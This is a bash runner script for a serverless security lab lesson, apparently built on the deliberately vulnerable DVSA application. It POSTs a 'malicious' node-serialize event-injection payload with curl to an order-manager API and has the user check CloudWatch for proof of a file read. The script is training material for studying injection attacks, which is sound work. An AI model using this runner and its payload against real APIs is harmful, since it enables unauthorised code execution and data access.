#!/bin/bash
# =============================================================
# Lesson 1 - Event Injection via node-serialize
# One-shot runner: curls the payload to DVSA-ORDER-MANAGER.
#
# Usage:
#   export API="https://YOUR-API-ID.execute-api.us-east-1.amazonaws.com/Stage/order"
#   bash run.sh
# =============================================================
set -u

HERE="$(cd "$(dirname "$0")" && pwd)"
PAYLOAD="$HERE/payload.json"

if [ -z "${API:-}" ]; then
  echo "ERROR: set API env var first." >&2
  echo '  export API="https://YOUR-API-ID.execute-api.us-east-1.amazonaws.com/Stage/order"' >&2
  exit 1
fi

echo "============================================"
echo " Lesson 1: Event Injection"
echo " Target : $API"
echo " Payload: $PAYLOAD"
echo "============================================"
echo ""
echo "[*] Sending malicious payload ..."

RESPONSE=$(curl -s -X POST "$API" \
  -H "Content-Type: application/json" \
  --data @"$PAYLOAD")

echo "[*] API Response: $RESPONSE"
echo ""
echo "[!] 'Internal server error' is EXPECTED. Real proof is in CloudWatch."
echo ""
echo "Verify:"
echo "  AWS Console -> CloudWatch -> /aws/lambda/DVSA-ORDER-MANAGER"
echo "  Look for: FILE READ SUCCESS: You are reading the contents of my hacked file!"
